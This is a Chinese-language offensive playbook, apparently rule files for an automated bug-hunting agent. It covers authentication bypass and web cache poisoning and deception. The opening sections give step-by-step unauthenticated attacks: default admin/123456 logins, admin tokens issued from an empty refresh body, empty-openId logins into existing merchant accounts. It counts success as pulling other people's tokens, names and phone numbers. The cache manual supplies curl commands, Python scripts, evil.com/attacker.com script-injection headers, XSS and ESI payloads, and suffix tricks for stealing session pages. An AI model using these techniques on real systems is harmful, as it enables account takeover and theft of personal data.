打：把这个字段放到 **HTTP 头**再打 SSO/换票/login。头没吃别停，改打 Cookie（设备 `uuid`/`os`/`platform` 一类自己编）。未登录写口（绑店/改状态）同样试，不要只打换票。对照：只放 query 应仍报缺少。

算成：出别人的登录票/姓名；或写上他人门店/对象。

假点：query 有该字段仍报缺少（头和 Cookie 都没吃）不算过；只出自己的票。单站没中不删短表这行。

### SSO 壳后面的账密登录口（短表有指针）

认：管理后台人打开只跳 SSO / 统一认证，页面没有账密框；后端仍暴露账密登录 API。别把 SSO 壳当成整摊没登录口。常见后台骨架 `/admin-api/system/auth/login` 是常见皮，没有这名仍打。

打（不登录）：

1. POST `/admin-api/system/auth/login`，body `{"username":"admin","password":"123456"}`（不要去磨 SSO 验证码）
2. 把 `data.accessToken` 放到 `Authorization: Bearer` 打 `/admin-api/system/tenant/page` 或 `/system/user/page`
3. 对照：错密应失败；默认口出 `userId=1` 一类平台票

算成：进了平台管理员号，且租户/用户列表出他人手机/姓名。

假点：登录口 404 或默认口已改；票只能进空租户没有联系人。密钥实值、某次 Token 不进库。单站没中不删短表这行。

### 刷新票空包发管理员票（短表有指针）

认：JSON 网关有刷新票口（`/api/auth/refresh` 一类）。不登录、空包 `{}` 就发票，票里身份是 `admin`（不是游客）。管理后台和前台走同一套云开发/网关。

打（不登录）：POST 刷新口；把 `data.token` 放到 `Authorization: Bearer` 打 `/api/admin/me/permissions` 和申请/用户名单。对照：不带这张票应未登录。

算成：me 是超级管理员（权限 `*`），或名单出现**他人**手机/姓名。

假点：只出游客/过期票；refresh 必须带旧 refresh token；me 仍是自己。密钥实值不进库。单站没中不删短表这行。

### 空 openId 进已有号（短表有指针）

认：小程序 / H5 的 GET 登录口吃 `openId`（`loginByOpenId` 一类）。缺参报缺字段，假 openId 登录失败，空串仍 200 出**已有商家号**和手机，不是游客空号。

打（不登录）：

1. 缺参一枪，确认这是登录口  
2. 假值一枪，应失败  
3. `openId=` 空串再打；GET query 没吃再试 POST JSON `{"openId":""}`  
4. 对照：空串出的店名/登录手机，和假值失败、缺参报缺，不是同一套游客号  

算成：进已有商家号且出手机（能当这个号用）。

假点：空串只出游客空号。密钥实值、某次 Cookie 不进库。单站没中不删短表这行。
TECH_AUTHBYPASS_TEST_EOF

seed_rule techniques/cache-poisoning-test.md <<'TECH_CACHE_POISONING_TEST_EOF'
> 结构：上半原有是主线（unkeyed / 欺骗）；下半补充 + 文末附件加深。先确认缓存键再打投毒。短表「缓存欺骗偷会话页」在原有「四、Web 缓存欺骗」下，用标题搜即可。
>
> 写不写只认 `rules/srcskill/vuln-report-format.md`。只探到缓存键、没有投毒/偷会话 → 继续跟投毒/偷会话。有会话个人页/账单/`/api/me` 就可以打后缀，不必先看见 `X-Cache`。没这类页，不要为了勾表空加 `.css`。

## 一、原有知识库

# 缓存投毒测试手册

## 一、Web 缓存投毒原理

### 核心概念

```
缓存键 (Cache Key): 决定缓存条目的唯一标识
  通常包含: Host, Path, Query String

Unkeyed 输入: 不在缓存键中，但影响响应内容的输入
  例如: X-Forwarded-Host, User-Agent, Cookie

攻击原理:
1. 找到 unkeyed 输入
2. 构造恶意请求，响应包含恶意内容
3. 响应被缓存
4. 其他用户访问相同 URL，获得被投毒的缓存
```

---

## 二、缓存键分析

### 2.1 识别缓存行为

```bash
# 发送两次相同请求，观察响应头
curl -I "https://target.com/page" -H "X-Test: 1"
curl -I "https://target.com/page" -H "X-Test: 2"

# 关注响应头:
# X-Cache: HIT / MISS
# CF-Cache-Status: HIT / MISS (Cloudflare)
# Age: 123 (缓存存在时间)
# Cache-Control: max-age=3600
```

### 2.2 测试 Unkeyed 输入

```python
import requests

def test_unkeyed_inputs(url):
    """测试哪些输入不在缓存键中"""
    
    headers_to_test = [
        "X-Forwarded-Host",
        "X-Forwarded-Scheme",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Forwarded-Proto",
        "X-Host",
        "X-Forwarded-Server",
        "User-Agent",
        "Accept-Language",
        "Cookie",
    ]
    
    for header in headers_to_test:
        # 发送带有唯一值的请求
        unique_value = f"test-{header}-123"
        r1 = requests.get(url, headers={header: unique_value})
        
        # 再次请求（不带该头）
        r2 = requests.get(url)
        
        # 如果 r2 响应中包含 unique_value → 该头是 unkeyed
        if unique_value in r2.text:
            print(f"[!] Unkeyed 输入发现: {header}")
            print(f"    响应中包含: {unique_value}")
```

---

## 三、常见 Unkeyed 输入

### 3.1 X-Forwarded-Host

```bash
# 攻击: 修改资源加载路径
curl "https://target.com/" \
  -H "X-Forwarded-Host: attacker.com"

# 如果响应中包含:
<script src="//attacker.com/static/js/app.js"></script>

# 结果: 缓存被投毒，所有用户加载攻击者的 JS
```

### 3.2 X-Forwarded-Scheme / X-Forwarded-Proto

```bash
# 攻击: 降级 HTTPS 到 HTTP
curl "https://target.com/" \
  -H "X-Forwarded-Scheme: http"

# 响应中的链接可能变成:
<link href="http://target.com/style.css">

# 结果: 中间人攻击风险
```

### 3.3 X-Original-URL / X-Rewrite-URL

```bash
# 攻击: 缓存错误页面到正常 URL
curl "https://target.com/normal-page" \
  -H "X-Original-URL: /admin/secret"

# 如果后端用 X-Original-URL 路由，但缓存用原始 URL
# 结果: /normal-page 被缓存为 /admin/secret 的内容
```

### 3.4 UTM 参数

```bash
# 营销参数通常不在缓存键中
curl "https://target.com/?utm_source=<script>alert(1)</script>"

# 如果响应中反射该参数:
<div>来源: <script>alert(1)</script></div>

# 结果: XSS 被缓存
```

---

## 四、Web 缓存欺骗

### 缓存欺骗偷会话页（短表有指针）

认：登录后个人页、账单、`/api/me`、设置页。有 `X-Cache` / `Age` / `Via` 更好认，**不是前提**。

打：

1. 未登录先打原 path，记下基线（应 401 / 登录页 / 空）。
2. **要会话**打开同一页，再请求 `原path/x.css`、`原path;.css`、`原path%2f.css`。
3. 看 `X-Cache: HIT` / `Age` 涨了没有。再**未登录**打同一个带后缀 URL。

算成：未登录拿到**别人**个人页/账单/会话页正文（姓名、手机、Cookie 页）。只 HIT 了 CSS 壳不算。

假点：`Cache-Control: no-store`；后缀被应用 404；要受害人先点才缓存、你这边没拿到他人数据。单站没中不删短表这行。有会话页就可以打，不必先看见缓存头。没个人页/账单不要为了勾表空加后缀。

投毒（unkeyed 头把别人页面改成你的 JS）是另一条，细节在下半补充和附件。

### 4.1 路径混淆

```bash
# 原理: 缓存和应用对路径的解析不一致

# 攻击 1: 静态资源后缀
curl "https://target.com/profile/victim.css"

# 缓存: 认为是 CSS 文件，缓存
# 应用: 忽略 .css，返回 /profile/victim 的内容
# 结果: 受害者的个人信息被缓存为公开的 CSS 文件

# 攻击 2: 路径参数
curl "https://target.com/profile;.css"
curl "https://target.com/profile%2f.css"
curl "https://target.com/profile%2e%2e%2fstatic/style.css"
```

### 4.2 诱导受害者访问

```html
<!-- 攻击者发送钓鱼邮件 -->
<img src="https://target.com/profile/victim.css">

<!-- 受害者点击后，其个人信息被缓存 -->
<!-- 攻击者访问相同 URL，获取缓存的敏感信息 -->
```

---

## 五、缓存键规范化差异

### 5.1 编码差异

```bash
# 缓存和应用对 URL 编码的处理不同

# 请求 1
curl "https://target.com/page?param=value"

# 请求 2
curl "https://target.com/page?param=%76%61%6c%75%65"

# 如果缓存认为两者不同，但应用认为相同
# 可以绕过缓存，直接访问应用
```

### 5.2 路径规范化

```bash
# 请求 1
curl "https://target.com/page"

# 请求 2
curl "https://target.com/./page"
curl "https://target.com//page"
curl "https://target.com/page/"

# 不同的规范化可能导致缓存绕过或投毒
```

---

## 六、CDN 特定技巧

### 6.1 Cloudflare

```bash
# Cloudflare 缓存键: Host + Path + Query String (sorted)

# Unkeyed 输入:
# - CF-Connecting-IP
# - CF-IPCountry
# - CF-Visitor
# - Cookie (部分)

# 测试
curl "https://target.com/" \
  -H "CF-Connecting-IP: 127.0.0.1"
```

### 6.2 Akamai

```bash
# Akamai 缓存键: 可配置，通常包含 Host + Path

# Unkeyed 输入:
# - True-Client-IP
# - X-Forwarded-For
# - Pragma: akamai-x-cache-on (调试头)

# 测试
curl "https://target.com/" \
  -H "True-Client-IP: 127.0.0.1" \
  -H "Pragma: akamai-x-cache-on"
```

### 6.3 Fastly

```bash
# Fastly 缓存键: Host + Path + Query String

# Unkeyed 输入:
# - Fastly-Client-IP
# - X-Forwarded-Host
# - Surrogate-Key (缓存标签)

# 测试
curl "https://target.com/" \
  -H "X-Forwarded-Host: attacker.com"
```

---

## 七、测试工具

### 7.1 Param Miner (Burp 插件)

```
功能:
- 自动检测 unkeyed 输入
- 测试缓存键组成
- 识别缓存投毒机会

使用:
1. Burp → Extender → BApp Store → Param Miner
2. 右键请求 → Extensions → Param Miner → Guess headers
3. 查看结果
```

### 7.2 手动测试脚本

```python
import requests
import hashlib

def test_cache_poisoning(url, header, value):
    """测试缓存投毒"""
    
    # 生成唯一标识
    unique_id = hashlib.md5(f"{header}{value}".encode()).hexdigest()[:8]
    
    # 发送投毒请求
    poison_value = f"{value}-{unique_id}"
    r1 = requests.get(url, headers={header: poison_value})
    
    print(f"[*] 发送投毒请求: {header}: {poison_value}")
    print(f"    响应状态: {r1.status_code}")
    print(f"    缓存状态: {r1.headers.get('X-Cache', 'Unknown')}")
    
    # 等待缓存生效
    import time
    time.sleep(2)
    
    # 发送正常请求（不带恶意头）
    r2 = requests.get(url)
    
    print(f"[*] 发送正常请求")
    print(f"    响应状态: {r2.status_code}")
    print(f"    缓存状态: {r2.headers.get('X-Cache', 'Unknown')}")
    
    # 检查是否被投毒
    if unique_id in r2.text:
        print(f"[!] 缓存投毒成功！")
        print(f"    响应中包含: {unique_id}")
        return True
    else:
        print(f"[-] 缓存投毒失败")
        return False

# 使用示例
url = "https://target.com/"
headers_to_test = [
    ("X-Forwarded-Host", "attacker.com"),
    ("X-Forwarded-Scheme", "http"),
    ("X-Original-URL", "/admin"),
]

for header, value in headers_to_test:
    test_cache_poisoning(url, header, value)
    print("-" * 80)
```

### 7.3 缓存键探测

```python
def detect_cache_key(url):
    """探测缓存键组成"""
    
    import random
    
    components = {
        "Host": f"test{random.randint(1000,9999)}.com",
        "Path": f"/test{random.randint(1000,9999)}",
        "Query": f"?test={random.randint(1000,9999)}",
        "Method": "POST",
        "Body": f"test={random.randint(1000,9999)}",
    }
    
    results = {}
    
    # 测试每个组件
    for component, value in components.items():
        # 发送两次请求，第二次修改该组件
        r1 = requests.get(url)
        cache_status_1 = r1.headers.get('X-Cache', 'Unknown')
        
        if component == "Host":
            r2 = requests.get(url, headers={"Host": value})
        elif component == "Path":
            r2 = requests.get(url + value)
        elif component == "Query":
            r2 = requests.get(url + value)
        elif component == "Method":
            r2 = requests.post(url)
        elif component == "Body":
            r2 = requests.post(url, data=value)
        
        cache_status_2 = r2.headers.get('X-Cache', 'Unknown')
        
        # 如果第二次是 MISS，说明该组件在缓存键中
        if cache_status_2 == "MISS":
            results[component] = "In cache key"
        else:
            results[component] = "Not in cache key"
    
    return results
```

---

## 八、利用场景

### 8.1 XSS 缓存投毒

```bash
# 找到反射 XSS 点
curl "https://target.com/search?q=<script>alert(1)</script>"

# 如果该页面被缓存，所有用户访问时触发 XSS
```

### 8.2 钓鱼页面缓存

```bash
# 投毒首页，显示钓鱼内容
curl "https://target.com/" \
  -H "X-Forwarded-Host: attacker.com"

# 响应中加载攻击者的 JS，显示假登录框
```

### 8.3 敏感信息泄露

```bash
# 缓存欺骗，将个人信息缓存为公开资源
curl "https://target.com/profile/victim.css"

# 攻击者访问相同 URL，获取受害者信息
```

---

## 九、防护检测

```python
# 检测是否有防护

# 1. 严格的缓存键
# 特征: 所有影响响应的输入都在缓存键中

# 2. 输入验证
# 特征: 拒绝异常的 X-Forwarded-* 头

# 3. 缓存隔离
# 特征: 敏感页面不被缓存（Cache-Control: no-store）

# 4. 响应头检查
# 特征: 响应中不反射 unkeyed 输入
```

---

## 十一、参考资源

```
# Web Cache Poisoning 研究
https://portswigger.net/research/practical-web-cache-poisoning

# Web Cache Deception 研究
https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html

# Burp Param Miner
https://github.com/PortSwigger/param-miner
```

---

## 二、补充：web-cache

### web-cache

### Web Cache Deception

## 1. CORE CONCEPTS

### Web Cache Deception (steal authenticated data)

The attacker tricks a victim into requesting their authenticated page at a URL that the cache considers static:

```
Victim visits: https://target.com/account/profile/nonexistent.css
→ Application ignores "nonexistent.css", serves /account/profile (with auth data)
→ CDN sees .css extension → caches the response
→ Attacker fetches: https://target.com/account/profile/nonexistent.css
→ CDN serves cached authenticated content → attacker reads victim's data
```

### Web Cache Poisoning (serve malicious content)

The attacker manipulates unkeyed request components (headers, cookies) to make the cache store a malicious response:

```
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
→ Application generates: <script src="https://evil.com/js/app.js">
→ Cache stores this response
→ Normal users hit cache → load attacker's JavaScript
```

---

## 2. CACHE DECEPTION — ATTACK METHODOLOGY

### Step 1: Identify Cacheable Path Patterns

CDNs typically cache by file extension:
```text
.css  .js  .jpg  .png  .gif  .svg  .ico
.woff .woff2  .ttf  .pdf  .json (sometimes)
```

### Step 2: Test Path Confusion

```text
### Append static extension to authenticated endpoint:
https://target.com/api/me/info.css
https://target.com/account/profile/x.js
https://target.com/settings/avatar.png
https://target.com/dashboard/data.json

### Path traversal style:
https://target.com/account/profile/..%2fstatic/app.css
```

### Step 3: Verify Caching

```bash
### Request as victim (authenticated):
curl -H "Cookie: session=VICTIM" https://target.com/account/profile/x.css

### Check response headers:
### X-Cache: MISS (first request)
### Age: 0

### Request again as attacker (no auth):
curl https://target.com/account/profile/x.css

### Check response:
### X-Cache: HIT
### Contains victim's authenticated content? → vulnerable
```

### Step 4: Deliver to Victim

Send the crafted URL to victim via phishing, message, or embed:
```
https://target.com/account/profile/tracking.gif
```

---

## 3. CACHE POISONING — ATTACK METHODOLOGY

### Unkeyed Input Discovery

Cache keys typically include: `Host`, URL path, query string.
These are typically NOT in the cache key: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, cookies, custom headers.

```bash
### Test if X-Forwarded-Host is reflected but not keyed:
curl -H "X-Forwarded-Host: evil.com" https://target.com/page
### If response contains evil.com and caches → poisonable
```

### Common Unkeyed Headers

```text
X-Forwarded-Host      X-Forwarded-Scheme    X-Forwarded-Proto
X-Original-URL        X-Rewrite-URL         X-Host
X-Forwarded-Server    Forwarded             True-Client-IP
```

### Cache Poisoning via Host Header

```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

→ Response: <link href="//evil.com/static/main.css">
→ Cached → all users load attacker's CSS/JS
```

---

## 4. PATH NORMALIZATION DIFFERENCES

The key to cache deception: **CDN and application normalize paths differently**.

| Component | Behavior |
|---|---|
| CDN (Cloudflare, Akamai) | Caches based on full URL path including extension |
| Application (Rails, Django, Express) | May ignore trailing path segments or extensions |
| Reverse proxy (Nginx) | May strip or rewrite path before forwarding |

```text
### Application treats these as equivalent:
/account/profile
/account/profile/anything
/account/profile/x.css
/account/profile;.css

### CDN treats .css as cacheable static asset
→ Mismatch = vulnerability
```

---

## 5. CACHE POISONING REAL-WORLD PATTERN

### X-Forwarded-Host → Open Graph / Meta Tag Injection

```text
### Target page uses X-Forwarded-Host to generate meta tags:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

### Response:
<meta property="og:image" content="https://evil.com/assets/logo.png">
### or:
<link rel="canonical" href="https://evil.com/">

### If response is cached → all users see evil.com references
### Impact: XSS via injected JS path, phishing via canonical redirect, SEO hijack
```

### Cache Deception with Path Separator Tricks

```text
### Semicolon (treated as path parameter by some frameworks):
/account/profile;.css

### Encoded separators:
/account/profile%2F.css

### Trailing dot/space:
/account/profile/.css
/account/profile .css
```

---

## 6. DEFENSE

### For Cache Deception

- Cache only explicitly static paths (e.g., `/static/*`, `/assets/*`)
- Never cache based on file extension alone
- Set `Cache-Control: no-store, private` on authenticated endpoints
- Use `Vary: Cookie` to prevent cross-user cache hits

### For Cache Poisoning

- Include all reflected headers in cache key
- Validate and sanitize `X-Forwarded-*` headers
- Use `Cache-Control: no-cache` for dynamic content
- Strip unknown headers at CDN edge

---

## 6. TESTING CHECKLIST

```
□ Identify CDN/cache layer (X-Cache, Age, Via headers)
□ Append .css/.js/.png to authenticated API endpoints
□ Check if response is cached (X-Cache: HIT on second request)
□ Test path separators: /x.css, ;.css, %2F.css
□ Test unkeyed headers: X-Forwarded-Host, X-Original-URL
□ Verify Cache-Control headers on sensitive endpoints
□ Check Vary header presence
□ Test with and without authentication
```


---


## 附件：CACHE_POISONING_TECHNIQUES

### Web Cache Poisoning Techniques — Advanced Reference


## 1. WEB CACHE POISONING vs WEB CACHE DECEPTION

These are **distinct attack classes** — do not confuse them.

| Aspect | Cache Poisoning | Cache Deception |
|---|---|---|
| **Goal** | Serve **malicious content** to all users | Steal **victim's authenticated data** |
| **Who triggers** | Attacker sends poisoning request | Victim visits crafted URL |
| **What gets cached** | Attacker-controlled response (XSS, redirect) | Victim's authenticated response |
| **Who is harmed** | All users who hit the cache | The specific victim whose data is cached |
| **Attacker's role** | Active (sends request with unkeyed poison) | Passive (waits for victim, then reads cache) |
| **Key technique** | Unkeyed input manipulation | Path confusion / extension appending |
| **Detection signal** | Response contains unexpected injected content | Authenticated content accessible without auth |

### Attack Flow Comparison

```
CACHE POISONING:
  Attacker → sends request with X-Forwarded-Host: evil.com
  → Cache stores response with evil.com references
  → Normal users get poisoned response

CACHE DECEPTION:
  Attacker → tricks victim into visiting /profile/x.css
  → Server returns victim's profile data (ignores x.css)
  → Cache stores response (thinks it's static CSS)
  → Attacker fetches /profile/x.css → reads victim's data
```

---

## 2. UNKEYED HEADER POISONING

### 2.1 Cache Key Basics

The **cache key** is what the cache uses to determine if a stored response matches a request. Typically includes:
- HTTP method
- Host header
- URL path
- Query string (sometimes)

**NOT typically included** (= unkeyed):
- Most request headers
- Cookies (sometimes)
- Request body (for GET)

If an unkeyed input is **reflected** in the response, it can be poisoned.

### 2.2 X-Forwarded-Host Poisoning

The most common cache poisoning vector.

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

HTTP/1.1 200 OK
...
<script src="https://evil.com/static/app.js"></script>
```

If `X-Forwarded-Host` is not in the cache key but is reflected in the response → poison stores `evil.com` JavaScript for all users requesting `/`.

**Common reflection points**:
- `<script src="...">` and `<link href="...">`
- Open Graph meta tags: `<meta property="og:url" content="...">`
- Canonical links: `<link rel="canonical" href="...">`
- Resource prefetch: `<link rel="dns-prefetch" href="...">`
- Dynamic import maps

### 2.3 X-Forwarded-Scheme / X-Forwarded-Proto

Forces HTTPS → HTTP downgrade in cached response:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http

HTTP/1.1 301 Moved
Location: http://target.com/    ← now HTTP, not HTTPS
```

Cache stores a redirect to HTTP → MITM opportunity for all cached users.

### 2.4 X-Original-URL / X-Rewrite-URL

Some frameworks (IIS/ASP.NET, Symfony) use these headers to override the request path:

```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin/delete-user?id=1

Cache key = GET /
But server processes /admin/delete-user?id=1
Response gets cached under /
```

### 2.5 Multiple Host Headers

```http
GET / HTTP/1.1
Host: target.com
Host: evil.com

### Some caches key on first Host, some apps use last Host
### If cache keys on target.com but app reflects evil.com → poisoned
```

### 2.6 X-Forwarded-Port

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Port: 1337

### If port is reflected in absolute URLs:
### <a href="https://target.com:1337/path">
### May cause resource loading failures → DoS via cache poisoning
```

### 2.7 Discovery Methodology

```bash
### Step 1: Identify cache (check response headers)
curl -v https://target.com/ 2>&1 | grep -i "x-cache\|age\|via\|cf-cache"

### Step 2: Find reflected unkeyed headers
### Send request with unique header values:
curl -H "X-Forwarded-Host: canary123.com" https://target.com/ | grep "canary123"
curl -H "X-Forwarded-Scheme: canary" https://target.com/ | grep "canary"
curl -H "X-Original-URL: /canary" https://target.com/ | grep "canary"

### Step 3: Verify it's unkeyed
### Send normal request → check if canary value is in cached response:
curl https://target.com/ | grep "canary123"
### If found → successfully poisoned

### Tool: Param Miner (Burp extension) automates unkeyed header discovery
```

---

## 3. UNKEYED PARAMETER POISONING

### 3.1 Concept

Some query parameters are excluded from the cache key (for tracking, analytics, etc.) but are reflected in the response.

### 3.2 Common Unkeyed Parameters

```
utm_content      utm_source       utm_medium       utm_campaign
utm_term         fbclid           gclid            _ga
dclid            msclkid          mc_eid           ref
callback         jsonp            _                cb
```

### 3.3 Example Attack

```http
GET /page?utm_content="><script>alert(1)</script> HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
...
<a href="/page?utm_content="><script>alert(1)</script>">Share</a>
```

Cache key: `GET /page` (utm_content excluded)
Response: contains XSS payload
Result: all users visiting `/page` get XSS.

### 3.4 Parameter Discovery

```bash
### Burp Param Miner: "Guess query parameters" scan

### Manual: append unique parameter and check if cache key changes
curl "https://target.com/page?cachebuster=abc123" -v
### → X-Cache: MISS (new cache entry? or same as /page?)

curl "https://target.com/page" -v
### → X-Cache: HIT and response matches previous? Then /page is the key (query excluded)
### → X-Cache: MISS? Then query IS in the key
```

### 3.5 Reflected Parameter in JavaScript

```http
GET /page?callback=alert HTTP/1.1

HTTP/1.1 200 OK
<script>
var config = {
  callback: "alert",  // reflected from query parameter
  ...
};
</script>
```

If `callback` is excluded from cache key but reflected in JavaScript:

```http
GET /page?callback=alert(document.cookie)// HTTP/1.1
```

Cached for all users requesting `/page`.

---

## 4. FAT GET CACHE POISONING

### 4.1 Concept

Some origins accept and process GET request **body** (despite RFC discouraging it). If the cache ignores the body (not in cache key) but the origin reflects body content, the response can be poisoned.

### 4.2 Example

```http
GET /api/config HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

callback=alert(1)

HTTP/1.1 200 OK
Content-Type: application/javascript
Cache-Control: public, max-age=3600

alert(1)({"theme":"default","lang":"en"})
```

Cache key: `GET /api/config` (body not included)
Response: contains attacker's callback value
Result: all users get `alert(1)` when loading `/api/config`.

### 4.3 Detection

```bash
### Step 1: Check if origin processes GET body
curl -X GET https://target.com/api/endpoint \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=canary_value"
### Check if canary_value appears in response

### Step 2: Check if response is cached
curl https://target.com/api/endpoint
### Check X-Cache header and whether canary_value persists

### If canary in cached response → Fat GET poisoning confirmed
```

### 4.4 Frameworks That Process GET Body

| Framework | GET Body Processing |
|---|---|
| Ruby on Rails | Yes (parsed by default) |
| Express.js | Depends on middleware (body-parser) |
| Django | Yes (request.POST populated for GET with body) |
| Flask | Yes (request.form available) |
| ASP.NET | Depends on model binding configuration |
| Spring | Depends on `@RequestBody` annotation |

---

## 5. PARAMETER CLOAKING

### 5.1 Semicolon as Parameter Separator

Some platforms treat `;` as a parameter separator, others don't:

```http
GET /page?legit=value;poison=xss HTTP/1.1

### Ruby on Rails: parses as two params: legit=value, poison=xss
### PHP: parses as one param: legit=value;poison=xss
### Cache (Varnish): may key on "legit=value;poison=xss" as opaque string
```

**Exploit**: if cache keys on full query string but back-end parses `;` as separator:

```http
GET /page?legit=value;callback=alert(1) HTTP/1.1

### Cache key: /page?legit=value;callback=alert(1)
### Origin parses: legit=value AND callback=alert(1)
### Response reflects: alert(1) in callback
### Next request to /page?legit=value;callback=alert(1) gets poisoned response
```

### 5.2 Different Delimiter Parsing

| Platform | `;` Behavior | `&` Behavior |
|---|---|---|
| PHP | Literal (part of value) | Parameter separator |
| Ruby on Rails | Parameter separator | Parameter separator |
| Java (Servlet) | Parameter separator (`;` in path = path parameter) | Parameter separator |
| ASP.NET | Depends on configuration | Parameter separator |
| Node.js (querystring) | Literal | Parameter separator |
| Python (urllib) | Can be configured as separator | Parameter separator |

### 5.3 Duplicate Parameters

```http
GET /page?param=safe&param=<script>alert(1)</script> HTTP/1.1

### Cache may key on first occurrence: param=safe
### Origin may use last occurrence: param=<script>alert(1)</script>
```

| Platform | Duplicate Parameter Behavior |
|---|---|
| PHP | Last value wins |
| ASP.NET | Comma-joined (both values) |
| Ruby on Rails | Last value wins |
| Python Flask | First value wins |
| Java Servlet | First value wins (`getParameter`), all values (`getParameterValues`) |
| Node.js Express | Array of all values |

### 5.4 URL Path Parameter Cloaking

```http
### Semicolons in URL path (Java servlet path parameters):
GET /page;jsessionid=abc;param=value HTTP/1.1

### Tomcat/Jetty: strips ;param=value from path
### Cache: may include full path in key or strip differently
```

---

## 6. CDN-SPECIFIC BEHAVIOR

### 6.1 Cloudflare

```
### Cache status header: cf-cache-status
### Values: HIT, MISS, EXPIRED, DYNAMIC, BYPASS

### Default caching: by file extension (.js, .css, .png, etc.)
### Query strings: included in cache key by default
### Headers in key: Host only

### Page Rules: can force cache of HTML / API responses
### Cache-Control respected: yes

### Bypass methods:
### - Set Cache-Control: no-cache on origin
### - Use __cf_chl_jschl_tk__ (Cloudflare challenge token) — not in key

### Interesting behaviors:
### - Cloudflare Workers can modify cache key
### - cf-connecting-ip header added (unkeyed, may be reflected)
### - True-Client-IP header (unkeyed on some plans)
```

### 6.2 AWS CloudFront

```
### Cache status header: x-cache (Hit from cloudfront / Miss from cloudfront)
### Also: x-amz-cf-id, x-amz-cf-pop

### Default cache key: Host + URI path + query string
### Query strings: can be configured (all, none, whitelist)
### Headers in key: configurable via Cache Policy (Host, Accept, etc.)
### Cookies in key: configurable (all, none, whitelist)

### Gotchas:
### - Default: query strings NOT in cache key (must configure)
### - Default: cookies NOT in cache key
### - Can whitelist specific headers/cookies into key

### Poisoning opportunity:
### If query strings excluded → append reflected param → poison
### If X-Forwarded-Host not in key but reflected → classic poisoning
```

### 6.3 Akamai

```
### Cache status header: X-Cache (TCP_HIT, TCP_MISS)
### Also: X-Akamai-Request-ID

### Cache key (default): Host + path + query (configurable)
### "Cache ID Modification" feature: custom key composition
### "Remove Vary Header" feature: strips Vary

### Interesting behaviors:
### - Pragma: akamai-x-cache-on (enable cache debug)
### - Pragma: akamai-x-get-cache-key (reveal cache key)
### - Akamai-Transform header (can affect response)
### - True-Client-IP (unkeyed, may be reflected)

### Revealing cache key (if debug enabled):
curl -H "Pragma: akamai-x-get-cache-key" https://target.com/ -v
```

### 6.4 Varnish

```
### Cache status header: X-Varnish (two IDs = HIT, one ID = MISS)
### Also: Age, Via (varnish)

### Default cache key: req.url (path + query)
### VCL customization: hash_data() in vcl_hash
### Default: does NOT cache requests with Cookie header

### Interesting behaviors:
### - obj.hits indicates number of cache hits
### - X-Varnish-Cache header (custom)
### - Builtin: strips If-Modified-Since on cache hit

### VCL key inspection:
### If you have access to VCL config, look at vcl_hash for key composition
### sub vcl_hash {
###   hash_data(req.url);
###   hash_data(req.http.host);
### }
```

### 6.5 Fastly

```
### Cache status header: X-Cache (HIT, MISS)
### Also: X-Served-By, X-Cache-Hits, X-Timer

### Fastly uses Varnish under the hood
### VCL-based configuration
### Default cache key: URL + Host
### Surrogate-Control header: overrides Cache-Control for CDN
### Fastly-Debug: 1 (if enabled → reveals cache details)

### Interesting behaviors:
### - Surrogate-Key header for purge targeting
### - stale-while-revalidate support
### - ESI (Edge Side Includes) support — can be attack vector
```

### 6.6 CDN Cache Key Comparison

| CDN | Default Cache Key Components | Query String Default | Cookie Default |
|---|---|---|---|
| Cloudflare | Host + path + query | Included | Excluded |
| CloudFront | Host + path (query configurable) | Excluded by default | Excluded |
| Akamai | Host + path + query | Included | Excluded |
| Varnish | URL (path + query) | Included | Excluded (no cache with Cookie) |
| Fastly | Host + URL | Included | Excluded |
| Nginx (proxy_cache) | `$scheme$proxy_host$request_uri` | Included | Excluded |

---

## 7. VARY HEADER MANIPULATION

### 7.1 How Vary Works

The `Vary` header tells caches which request headers affect the response. Cache must store separate entries for different values of Vary'd headers.

```http
HTTP/1.1 200 OK
Vary: Accept-Encoding, Accept-Language
```

This means: cache must key on `Accept-Encoding` AND `Accept-Language` values.

### 7.2 Cache Partitioning Attack

If `Vary` doesn't include a header that the application uses to generate different content:

```http
### Application returns different content based on User-Agent:
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (mobile)
→ Returns mobile version

GET / HTTP/1.1  
User-Agent: Mozilla/5.0 (desktop)
→ Returns desktop version

### If Vary does NOT include User-Agent:
### Cache stores one response for all User-Agent values
### Attacker can poison mobile users with desktop content (or vice versa)
```

### 7.3 Vary Header Injection

If attacker can influence the Vary header value:

```http
### Application sets Vary based on request:
Vary: Accept-Encoding, X-Custom-Header

### If attacker adds X-Custom-Header:
GET / HTTP/1.1
X-Custom-Header: unique-value

### Cache creates new partition for this unique value
### Attacker poisons only this partition
### Then links victim to URL with same X-Custom-Header value
```

### 7.4 Vary: * (Wildcard)

```http
Vary: *
```

Tells cache to never serve cached version. Some caches respect this, others ignore it.

| CDN | Vary: * Behavior |
|---|---|
| Cloudflare | Does not cache |
| CloudFront | Does not cache |
| Varnish | Depends on VCL config |
| Nginx | Does not cache (default) |

### 7.5 Missing Vary as a Vulnerability

```
### Application returns personalized content:
GET /dashboard HTTP/1.1
Cookie: session=USER_A_TOKEN
→ Returns User A's dashboard

### If response lacks Vary: Cookie AND cache stores it:
### → User B requests /dashboard → gets User A's cached dashboard
### This IS cache deception (without the victim needing to visit a crafted URL)
```

---

## 8. ADVANCED TECHNIQUES

### 8.1 Cache Poisoning via Error Pages

```http
### Trigger a 404 with injected content:
GET /nonexistent%0D%0AX-Injected:%20yes HTTP/1.1
Host: target.com

### If 404 page reflects the requested path and is cached:
### All users requesting this path get the injected error page
```

### 8.2 Edge Side Includes (ESI) Injection

```http
### If CDN supports ESI and reflects unkeyed input:
GET / HTTP/1.1
X-Forwarded-Host: evil.com

Response:
<esi:include src="http://evil.com/xss.html"/>

### ESI is processed by the cache/CDN → fetches and includes evil content
```

